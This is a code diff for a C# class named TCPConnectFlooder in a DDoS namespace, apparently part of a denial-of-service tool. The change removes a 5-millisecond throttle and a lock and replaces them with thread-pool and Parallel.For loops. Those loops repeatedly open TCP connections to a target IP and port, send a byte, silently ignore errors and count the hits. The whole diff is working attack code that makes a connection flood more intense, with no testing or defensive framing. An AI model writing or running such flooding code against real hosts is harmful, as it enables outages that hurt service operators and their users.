@@ -1,15 +1,17 @@
 ﻿using System.Net.Sockets;
 
-namespace DDOS;
+namespace DDoS;
 
 // Manages TCP connect flood: Opens many TCP connections without sending data.
 // DOC: https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.socket
-public class TCPConnectFlooder : IDisposable
+public class TCPConnectFlooder
 {
     private readonly List<Socket> _connections = [];
     private readonly String _ip;
     private readonly Int32 _port;
     private readonly Int32 _maxConnections;
+
+    private volatile Int32 _count;
     private volatile Boolean _running = false;
 
     public TCPConnectFlooder(String ip, Int32 port, Int32 maxConnections)
@@ -23,30 +25,30 @@ public class TCPConnectFlooder : IDisposable
     public void Start()
     {
         _running = true;
-        new Thread(() =>
+
+        ThreadPool.SetMinThreads(_maxConnections, _maxConnections);
+        ThreadPool.QueueUserWorkItem(_ =>
         {
             while (_running)
             {
-                try
+                Parallel.For(0, _maxConnections, i =>
                 {
-                    lock (_connections)
+                    try
                     {
-                        // Maintain maxConnections
-                        if (_connections.Count < _maxConnections)
-                        {
-                            Socket sock = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                            sock.Connect(_ip, _port);
-                            _connections.Add(sock);
-                        }
+                        using Socket sock = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        sock.Connect(_ip, _port);
+
+                        // Optional: Send minimal data, this step may simulate a real request
+                        sock.Send(new Byte[] { 0x00 });
+                        Interlocked.Increment(ref _count);
                     }
-                }
-                catch
-                {
-                    // Ignore failed connect, server might refuse or drop
-                }
-                Thread.Sleep(5); // Adjust connection rate, tránh quá tải máy bạn
+                    catch
+                    {
+                        // Silently ignore any failure in connection
+                    }
+                });
             }
-        }).Start();
+        });
     }
 
     // Stop flooding and release sockets
@@ -64,17 +66,6 @@ public class TCPConnectFlooder : IDisposable
         }
     }
 
-    public void Dispose() => Stop();
-
     // Get current connection count for display
-    public Int32 ConnectionCount
-    {
-        get
-        {
-            lock (_connections)
-            {
-                return _connections.Count;
-            }
-        }
-    }
+    public Int32 ConnectionCount => _count;
 }
